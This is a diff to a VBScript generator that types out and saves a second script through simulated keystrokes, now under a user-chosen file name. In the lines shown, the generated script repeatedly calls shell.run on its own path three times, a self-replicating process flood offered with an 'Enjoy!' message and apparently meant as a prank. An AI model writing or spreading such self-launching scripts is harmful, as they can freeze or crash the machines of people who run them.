@@ -1,11 +1,15 @@
 Option Explicit
 
-dim keyboard, sentence, directory, password, i
+dim keyboard, sentence, directory, password, name, i
 
 set keyboard = createobject("wscript.shell")
 
 do until password <> ""
 password = inputbox("Enter the custom password: ")
+loop
+
+do until name <> ""
+name = inputbox("Enter the name of the file: ")
 loop
 
 do until directory <> ""
@@ -60,7 +64,7 @@ type_word("function duplicate+9+0")
 enter_key()
 
 for i = 1 to 3
-type_word("shell.run " & """""" & "" & Chr(34) & directory & "\custom duplicate.vbs" & Chr(34) & "" & """""" & "")
+type_word("shell.run " & """""" & "" & Chr(34) & directory & "\" & name & Chr(34) & "" & """""" & "")
 enter_key()
 next
 
@@ -80,7 +84,7 @@ type_word("^s")
 
 wscript.sleep 1000
 
-type_word("custom duplicate.vbs")
+type_word(name & ".vbs")
 type_word("{F4}")
 type_word("^a")
 type_word("{BS}")
@@ -97,4 +101,4 @@ type_word("%{F4}")
 
 wscript.sleep 2000
 
-msgbox "Enjoy! " & Chr(34) & directory & "\custom duplicate.vbs" & Chr(34), 64, "Customization Complete"
+msgbox "Enjoy! " & Chr(34) & directory & "\" & name & ".vbs" & Chr(34), 64, "Customization Complete"
